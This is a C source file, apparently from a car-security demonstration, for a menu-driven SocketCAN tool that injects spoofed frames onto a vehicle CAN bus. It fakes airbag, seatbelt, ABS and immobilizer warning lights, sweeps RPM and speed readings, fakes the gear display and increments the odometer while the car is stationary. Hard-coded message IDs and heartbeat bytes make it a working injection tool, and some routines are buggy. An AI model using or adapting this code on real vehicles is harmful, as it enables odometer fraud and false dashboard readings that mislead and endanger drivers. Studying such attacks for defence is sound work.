#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>

#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>

#include <linux/can.h>
#include <linux/can/raw.h>

#include "lib.h"


#define NO_OF_MENU_OPTIONS (6+1)
#define CAN_NETWORK_NAME "slcan0" //define it to be a specific name for testing

void exit_program(int sig){
	exit(2);
}

int should_stop_sending_can_msges = 0;

void stop_sending_can_msges(int sig){
	should_stop_sending_can_msges = 1; /*flag for the program to quit infinite loop*/
	signal(SIGINT, exit_program);
}

enum Warning_lights{
	AIRBAGS_WARN = 0x0,
	SEATBELT_WARN = 0x1,
	ENG_OIL_AND_BATT_WARN = 0x2,
	ABS_AND_PARK_BRAKE_WARN = 0x3,
	IMMOBILIZER_WARN = 0x4,
	PARK_BRAKE_WARN = 0x5,
	ENG_CHECK_WARN = 0x6,
	END_OF_WARN
};

struct _warning_lights_options {
	int option_id;
	char *option_string;
	int can_msg_id;
	int can_msg_len;
	int heartbeat_bytes[4];
	int byte_to_turn_on;
	int byte_to_turn_off;
	int byte_position;
	int send_intervals_ms;
};

typedef int Can_socket;

struct _main_menu_options{
	int option_id;
	void (*function_to_execute)(Can_socket);
	char *menu_string;
};

struct _warning_lights_options warning_lights_options_array[6] = {
	{AIRBAGS_WARN, "[0] Airbag warning light\n", 0x39, 0x2, {0x39, 0x0C, 0x1B, 0x2A}, 0xFF, 0x00, 0x00, 20},
	{SEATBELT_WARN, "[1] Seatbelt warning light\n", 0x305, 0x2, {0x35, 0x08, 0x17, 0x26}, 0x80, 0x00, 0x00, 1000},
	{ENG_OIL_AND_BATT_WARN, "[2] Eng oil and battery warning lights\n", 0x324, 0x8, {0x32, 0x05, 0x14, 0x23}, 0x0E, 0x00, 0x06, 1000},
	{ABS_AND_PARK_BRAKE_WARN, "[3] ABS and parking brake warning lights\n", 0x1A4, 0x8, {0x36, 0x09, 0x18, 0x27}, 0xC0, 0x00, 0x03, 20},
	{IMMOBILIZER_WARN, "[4] Immobilizer warning light\n", 0x324, 0x8, {0x3E, 0x01, 0x01, 0x2F}, 0x20, 0x00, 0x06, 1000},
	{END_OF_WARN, NULL, 0x0, 0x0, {0x0, 0x0, 0x0, 0x0}, 0x00, 0x00, 0x00, 0}
};

void user_change_warn_lights(Can_socket s){

	int user_on_off_option, user_warn_lights_option;

	struct canfd_frame warning_light_frame; 
	int enable_canfd = 1;
	int mtu;
	int required_mtu = CAN_MTU; /**/
	int max_can_byte;

	printf( "\nWhich warning light?\n");
	int i = 0;
	do{
		printf("%s", warning_lights_options_array[i].option_string);
		i++;
	} while(warning_lights_options_array[i].option_string != NULL);
	printf("Your choice: ");

	if(scanf("%d", &user_warn_lights_option) <= 0){
		printf("Illegal input.\n");
		return;
	}
	if(user_warn_lights_option < 0 || user_warn_lights_option > 4){
		/*Invalid option*/
		printf("Illegal option.\n");
		return;
	}

	printf("\nTurn on or off?\n"
		"[0] Off\n"
		"[1] On\n"
		"Your choice: ");
	if(scanf("%d", &user_on_off_option) <= 0){
		printf("Illegal input.\n");
		return;
	}
	if(user_on_off_option < 0 || user_on_off_option > 1){
		/*Invalid option*/
		printf("Illegal option.\n");
		return;
	}
	struct _warning_lights_options *pntr_to_selected_warn_light = &(warning_lights_options_array[user_warn_lights_option]);
	memset(&warning_light_frame, 0x0, sizeof(warning_light_frame));
	warning_light_frame.can_id = pntr_to_selected_warn_light->can_msg_id;
	warning_light_frame.len = pntr_to_selected_warn_light->can_msg_len;
	warning_light_frame.data[pntr_to_selected_warn_light->byte_position] = (user_on_off_option == 1) ? pntr_to_selected_warn_light->byte_to_turn_on : pntr_to_selected_warn_light->byte_to_turn_off;
	
	/* Any other unique settings */
	switch(user_warn_lights_option){
		case AIRBAGS_WARN:
			break;
		case ENG_CHECK_WARN:
			warning_light_frame.data[2] = 0xFF;
			warning_light_frame.data[3] = 0xFF;
			warning_light_frame.data[6] = 0x20;
			break;
		case ENG_OIL_AND_BATT_WARN:
			warning_light_frame.data[0] = 0x66;
			warning_light_frame.data[1] = 0x5B;
			break;
		case IMMOBILIZER_WARN:
			warning_light_frame.data[0] = 0xFF;
			warning_light_frame.data[1] = 0xFF;
		case ABS_AND_PARK_BRAKE_WARN:
		default:
			break;
	}
	int heartbeat_index = 0;

	signal(SIGINT, stop_sending_can_msges);
	printf("Press Ctrl+C to stop spoofing and return to main menu.\n");
	while(1){
		warning_light_frame.data[pntr_to_selected_warn_light->can_msg_len-1] = pntr_to_selected_warn_light->heartbeat_bytes[heartbeat_index];
		if (write(s, &warning_light_frame, required_mtu) != required_mtu) {
			perror("write");
		}
		usleep(pntr_to_selected_warn_light->send_intervals_ms * 1000);
		heartbeat_index++;
		heartbeat_index %= 4;
		if(should_stop_sending_can_msges){
			should_stop_sending_can_msges = 0;
			goto return_to_main_menu;
		}
	}

return_to_main_menu:
	return;
}

void user_change_rpm(Can_socket s){
	struct canfd_frame rpm_frame; 
	int enable_canfd = 1;
	int mtu;
	int required_mtu = CAN_MTU; /**/

	printf("\n\n\nI will now increment RPM to 8000 and decrease it back to 0\n\n\n");	

	memset(&rpm_frame, 0, sizeof(rpm_frame));
	rpm_frame.can_id = 0x1DC;
	rpm_frame.len = 4;

	int heartbeat_bytes[4];
	int heartbeat_index = 0;

	rpm_frame.data[0] = 0x02;

	signal(SIGINT, stop_sending_can_msges);
	printf("Press Ctrl+C to stop spoofing and return to main menu.\n");
	while(1){
		for(int i = 0x0000; i < 0x2100; i+=16){
			if(should_stop_sending_can_msges){
				should_stop_sending_can_msges = 0;
				goto return_to_main_menu;
			}
			if(heartbeat_index==0){
				int first_hb_byte = (rand() % 10) + 0x20;
				int sec_hb_byte = (rand() % 10) + 0x30;
				int third_hb_byte = (rand() % 10) + 0x0;
				int fourth_hb_byte = (rand() % 10) + 0x10;
				heartbeat_bytes[0] = first_hb_byte;
				heartbeat_bytes[1] = sec_hb_byte;
				heartbeat_bytes[2] = third_hb_byte;
				heartbeat_bytes[3] = fourth_hb_byte;
			}
			rpm_frame.data[1] = (i & 0xFF00) >> 8;
			rpm_frame.data[2] = i & 0xFF;
			rpm_frame.data[3] = heartbeat_bytes[heartbeat_index];
			if (write(s, &rpm_frame, required_mtu) != required_mtu) {
				perror("write");
			}
			usleep(10 * 1000);
			heartbeat_index++;
			heartbeat_index %= 4;
		}
		for(int i = 0x2100; i >= 0x0000; i-=16){
			if(should_stop_sending_can_msges){
				should_stop_sending_can_msges = 0;
				goto return_to_main_menu;
			}
			if(heartbeat_index==0){
				int first_hb_byte = (rand() % 10) + 0x20;
				int sec_hb_byte = (rand() % 10) + 0x30;
				int third_hb_byte = (rand() % 10) + 0x0;
				int fourth_hb_byte = (rand() % 10) + 0x10;
				heartbeat_bytes[0] = first_hb_byte;
				heartbeat_bytes[1] = sec_hb_byte;
				heartbeat_bytes[2] = third_hb_byte;
				heartbeat_bytes[3] = fourth_hb_byte;
			}
			rpm_frame.data[1] = (i & 0xFF00) >> 8;
			rpm_frame.data[2] = i & 0xFF;
			rpm_frame.data[3] = heartbeat_bytes[heartbeat_index];
			if (write(s, &rpm_frame, required_mtu) != required_mtu) {
				perror("write");
			}
			usleep(10 * 1000);
			heartbeat_index++;
			heartbeat_index %= 4;
		}
	}

return_to_main_menu:
	return;

}

void user_change_speed(Can_socket s){

	struct canfd_frame speed_frame; 
	int enable_canfd = 1;
	int mtu;
	int required_mtu = CAN_MTU; /**/

	printf("\n\n\nI will now increment speed to 300km/h and decrease it back to 0km/h\n\n\n");	
	
	memset(&speed_frame, 0, sizeof(speed_frame));
	speed_frame.can_id = 0x158;
	speed_frame.len = CAN_MAX_DLEN;

	int heartbeat_bytes[4];
	int heartbeat_index = 0;

	signal(SIGINT, stop_sending_can_msges);
	printf("Press Ctrl+C to stop spoofing and return to main menu.\n");
	while(1){
		/*Increment speed from 0km/h to 300km/h*/
		for(int i = 0x0070; i < 0x7500; i+=8){
			if(should_stop_sending_can_msges){
				should_stop_sending_can_msges = 0;
				goto return_to_main_menu;
			}
			if(heartbeat_index==0){
				int first_hb_byte = (rand() % 10) + 0x20;
				int sec_hb_byte = (rand() % 10) + 0x30;
				int third_hb_byte = (rand() % 10) + 0x0;
				int fourth_hb_byte = (rand() % 10) + 0x10;
				heartbeat_bytes[0] = first_hb_byte;
				heartbeat_bytes[1] = sec_hb_byte;
				heartbeat_bytes[2] = third_hb_byte;
				heartbeat_bytes[3] = fourth_hb_byte;
			}
			speed_frame.data[0] = (i & 0xFF00) >> 8;
			speed_frame.data[1] = i & 0xFF;
			speed_frame.data[4] = (i & 0xFF00) >> 8;
			speed_frame.data[5] = i & 0xFF;
			speed_frame.data[7] = heartbeat_bytes[heartbeat_index];
			if (write(s, &speed_frame, required_mtu) != required_mtu) {
				perror("write");
			}
			usleep(10 * 1000);
			heartbeat_index++;
			heartbeat_index %= 4;
		}
		/*Decrement speed from 300km/h to 0km/h*/
		for(int i = 0x7100; i >= 0x00F0; i-=8){
			if(should_stop_sending_can_msges){
				should_stop_sending_can_msges = 0;
				goto return_to_main_menu;
			}
			if(heartbeat_index==0){
				int first_hb_byte = (rand() % 10) + 0x20;
				int sec_hb_byte = (rand() % 10) + 0x30;
				int third_hb_byte = (rand() % 10) + 0x0;
				int fourth_hb_byte = (rand() % 10) + 0x10;
				heartbeat_bytes[0] = first_hb_byte;
				heartbeat_bytes[1] = sec_hb_byte;
				heartbeat_bytes[2] = third_hb_byte;
				heartbeat_bytes[3] = fourth_hb_byte;
			}
			speed_frame.data[0] = (i & 0xFF00) >> 8;
			speed_frame.data[1] = i & 0xFF;
			speed_frame.data[4] = (i & 0xFF00) >> 8;
			speed_frame.data[5] = i & 0xFF;
			speed_frame.data[7] = heartbeat_bytes[heartbeat_index];
			if (write(s, &speed_frame, required_mtu) != required_mtu) {
				perror("write");
			}
			usleep(10 * 1000);
			heartbeat_index++;
			heartbeat_index %= 4;
		}
	}

return_to_main_menu:
	return;
}

enum gears {
	PARK,
	REVERSE,
	NEUTRAL,
	DRIVE,
	SLOW,
	ONE,
	TWO,
	THREE,
	FOUR,
	FIVE,
	SIX
};

struct _gear_options{
	int option_id;
	int can_data_to_send_excl_hb[5];
};

struct _gear_options gear_options_array [11] = {
	{PARK, {0x00, 0x00, 0x00, 0x01, 0x00}},
	{REVERSE, {0x07, 0x06, 0x00, 0x02, 0x00}},
	{NEUTRAL, {0x07, 0x00, 0x00, 0x04, 0x00}},
	{DRIVE, {0x07, 0x00, 0x80, 0x00, 0x00}},
	{SLOW, {0x00, 0x00, 0x00, 0x00, 0xD0}},
	{ONE, {0x00, 0x0D, 0x00, 0x00, 0x00}},
	{TWO, {0x00, 0xD0, 0x00, 0x00, 0x00}},
	{THREE, {0x00, 0x1C, 0x00, 0x00, 0x00}},
	{FOUR, {0x00, 0x67, 0x00, 0x00, 0x00}},
	{FIVE, {0x00, 0x2B, 0x00, 0x00, 0x00}},
	{SIX, {0x00, 0xB2, 0x00, 0x00, 0x00}}
};

void user_change_gear(Can_socket s){
	printf("\n\n\nWhich gear am I driving in?\n\n\n");

	struct canfd_frame gear_frame; 
	int enable_canfd = 1;
	int mtu;
	int required_mtu = CAN_MTU;

	memset(&gear_frame, 0, sizeof(gear_frame));
	gear_frame.can_id = 0x188;
	gear_frame.len = 6;

	int heartbeat_index = 0;
	int heartbeat_bytes[4];

	/*Duct tape version for demo purposes only*/
	for(int j=0; j<5;j++){
		struct _gear_options *ptr_to_chosen_gear = &(gear_options_array[j]);
		for (int i=0; i<6; i++){
			gear_frame.data[i] |= ptr_to_chosen_gear->can_data_to_send_excl_hb[i];
		}
	}

	struct _gear_options *ptr_to_chosen_gear = &(gear_options_array[SIX]);
	for (int i=0; i<6; i++){
		gear_frame.data[i] |= ptr_to_chosen_gear->can_data_to_send_excl_hb[i];
	}

	signal(SIGINT, stop_sending_can_msges);
	printf("Press Ctrl+C to stop spoofing and return to main menu.\n");
	while(1){
		if(should_stop_sending_can_msges){
			should_stop_sending_can_msges = 0;
			goto return_to_main_menu;
		}

		if(heartbeat_index==0){
			int first_hb_byte = (rand() % 10) + 0x20;
			int sec_hb_byte = (rand() % 10) + 0x30;
			int third_hb_byte = (rand() % 10) + 0x0;
			int fourth_hb_byte = (rand() % 10) + 0x10;
			heartbeat_bytes[0] = first_hb_byte;
			heartbeat_bytes[1] = sec_hb_byte;
			heartbeat_bytes[2] = third_hb_byte;
			heartbeat_bytes[3] = fourth_hb_byte;
		}

		gear_frame.data[5] = heartbeat_bytes[heartbeat_index];
		if (write(s, &gear_frame, required_mtu) != required_mtu) {
			perror("write");
		}
		usleep(10 * 1000);
		heartbeat_index++;
		heartbeat_index %= 4;
	}

return_to_main_menu:
	return;

}

void quit_program(Can_socket s){
	/*TODO: End program*/
	exit(0);
}

void increment_odometer(Can_socket s){
	struct canfd_frame odometer_frame;
	int enable_canfd = 1;
	int mtu;
	int required_mtu = CAN_MTU; /**/

	printf("\n\n\nWatch the odometer increment even though the speed is 0km/h.\n\n\n");	
	
	memset(&odometer_frame, 0, sizeof(odometer_frame));
	odometer_frame.can_id = 0x158;
	odometer_frame.len = CAN_MAX_DLEN;

	int heartbeat_bytes[4];
	int heartbeat_index = 0;


	signal(SIGINT, stop_sending_can_msges);
	printf("Press Ctrl+C to stop spoofing and return to main menu.\n");
	while(1){
		for(int i = 0; i <= 0xFF; i++){
			for(int j = 0; j < 20; j++){
				if(should_stop_sending_can_msges){
					should_stop_sending_can_msges = 0;
					goto return_to_main_menu;
				}
				if(heartbeat_index==0){
					int first_hb_byte = (rand() % 10) + 0x20;
					int sec_hb_byte = (rand() % 10) + 0x30;
					int third_hb_byte = (rand() % 10) + 0x0;
					int fourth_hb_byte = (rand() % 10) + 0x10;
					heartbeat_bytes[0] = first_hb_byte;
					heartbeat_bytes[1] = sec_hb_byte;
					heartbeat_bytes[2] = third_hb_byte;
					heartbeat_bytes[3] = fourth_hb_byte;
				}
				odometer_frame.data[6] = i & 0xFF;
				odometer_frame.data[7] = heartbeat_bytes[heartbeat_index];
				if (write(s, &odometer_frame, required_mtu) != required_mtu) {
					perror("write");
				}
				usleep(10 * 1000);
				heartbeat_index++;
				heartbeat_index %= 4;
			}
		}
	}
return_to_main_menu:
	return;
}

/*FOR TESTING*/
void decrement_odometer(Can_socket s){
	struct canfd_frame odometer_frame;
	int enable_canfd = 1;
	int mtu;
	int required_mtu = CAN_MTU; /**/

	printf("\n\n\nTESTING: Watch the odometer decrement.\n\n\n");	
	
	memset(&odometer_frame, 0, sizeof(odometer_frame));
	odometer_frame.can_id = 0x158;
	odometer_frame.len = CAN_MAX_DLEN;

	int heartbeat_bytes[4];
	int heartbeat_index = 0;


	signal(SIGINT, stop_sending_can_msges);
	printf("Press Ctrl+C to stop spoofing and return to main menu.\n");
	while(1){
		for(int i = 0x00; i >= 0x01; i--){
			for(int j = 0; j < 20; j++){
				if(should_stop_sending_can_msges){
					should_stop_sending_can_msges = 0;
					goto return_to_main_menu;
				}
				if(heartbeat_index==0){
					int first_hb_byte = (rand() % 10) + 0x20;
					int sec_hb_byte = (rand() % 10) + 0x30;
					int third_hb_byte = (rand() % 10) + 0x0;
					int fourth_hb_byte = (rand() % 10) + 0x10;
					heartbeat_bytes[0] = first_hb_byte;
					heartbeat_bytes[1] = sec_hb_byte;
					heartbeat_bytes[2] = third_hb_byte;
					heartbeat_bytes[3] = fourth_hb_byte;
				}
				odometer_frame.data[6] = i & 0xFF; //we only want the least significant byte
				odometer_frame.data[7] = heartbeat_bytes[heartbeat_index];
				if (write(s, &odometer_frame, required_mtu) != required_mtu) {
					perror("write");
				}
				usleep(10 * 1000);
				heartbeat_index++;
				heartbeat_index %= 4;
			}
		}
	}
return_to_main_menu:
	return;
}

struct _main_menu_options main_menu_options_array[NO_OF_MENU_OPTIONS] = {
	{0x0, user_change_warn_lights, "[0] Turn on/off warning lights\n"},
	{0x1, user_change_rpm, "[1] Demo RPM change\n"},
	{0x2, user_change_speed, "[2] Demo speed change\n"},
	{0x3, user_change_gear, "[3] Demo gear change\n"},
	{0x4, increment_odometer, "[4] Increment the odometer\n"},
	{0x5, quit_program, "[5] Exit\n"},
	{0x6, NULL, NULL}
};

static int print_main_menu(void){
	int i = 0;

	printf( "\nWhat would you like to do?\n");
	do{
		printf("%s", main_menu_options_array[i].menu_string);
		i++;
	} while(main_menu_options_array[i].menu_string != NULL);
	printf("Your choice: ");
}

int main(int argc, char **argv){
	int user_option = 0;
	int return_value;
	char tmp_chr;
	void *function_to_execute;

	struct sockaddr_can addr;
	struct ifreq ifr;
	
	Can_socket s; /* can raw socket */

	puts("                                                                ");
	puts("██████╗ ██╗██╗   ██╗ ██████╗      ██████╗ █████╗ ██████╗        ");
	puts("██╔══██╗██║██║   ██║██╔═████╗    ██╔════╝██╔══██╗██╔══██╗       "); 
	puts("██║  ██║██║██║   ██║██║██╔██║    ██║     ███████║██████╔╝       ");
	puts("██║  ██║██║╚██╗ ██╔╝████╔╝██║    ██║     ██╔══██║██╔══██╗       ");
	puts("██████╔╝██║ ╚████╔╝ ╚██████╔╝    ╚██████╗██║  ██║██║  ██║       ");
	puts("╚═════╝ ╚═╝  ╚═══╝   ╚═════╝      ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝       ");
	puts("                                                                ");
	puts("███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗  ");
	puts("██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝  ");
	puts("███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝   ");
	puts("╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝    ");
	puts("███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║     ");
	puts("╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝     ");
	puts("                                                                ");
	puts(" ██████╗ ██╗   ██╗ █████╗ ██████╗ ████████╗███████╗██████╗      ");
	puts("██╔═══██╗██║   ██║██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██╔══██╗     ");
	puts("██║   ██║██║   ██║███████║██████╔╝   ██║   █████╗  ██████╔╝     ");
	puts("██║▄▄ ██║██║   ██║██╔══██║██╔══██╗   ██║   ██╔══╝  ██╔══██╗     ");
	puts("╚██████╔╝╚██████╔╝██║  ██║██║  ██║   ██║   ███████╗██║  ██║     ");
	puts(" ╚══▀▀═╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝     ");
	puts("                                                                ");

	if ((s = socket(PF_CAN, SOCK_RAW, CAN_RAW)) < 0) {
		perror("socket");
		fprintf(stderr, "Error with socket.\n");
		exit(1);
	}

	strncpy(ifr.ifr_name, CAN_NETWORK_NAME, IFNAMSIZ - 1);
	ifr.ifr_name[IFNAMSIZ - 1] = '\0';
	ifr.ifr_ifindex = if_nametoindex(ifr.ifr_name);
	if (!ifr.ifr_ifindex) {
		perror("if_nametoindex");
		exit(1);
	}

	memset(&addr, 0, sizeof(addr));
	addr.can_family = AF_CAN;
	addr.can_ifindex = ifr.ifr_ifindex;
	setsockopt(s, SOL_CAN_RAW, CAN_RAW_FILTER, NULL, 0);

	if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
		perror("bind");
		exit(1);
	}

	while(1/*program should run forever*/ ){
		print_main_menu();
		if(scanf("%d", &user_option) <= 0){
			printf("Illegal input.\n");
			exit(1);
		}	
		if(user_option < 0 || user_option > (NO_OF_MENU_OPTIONS-1)){
			/*Invalid option*/
			printf("Illegal option.\n");
			continue;
		}
		main_menu_options_array[user_option].function_to_execute(s);
		/*print options for user to choose from*/	
		/*process user options*/
	}
}


#define send_can_msg(s, frame,len) \
	write(s, frame, len)
	/*TODO: This function would be responsible for sending a CAN msg*/

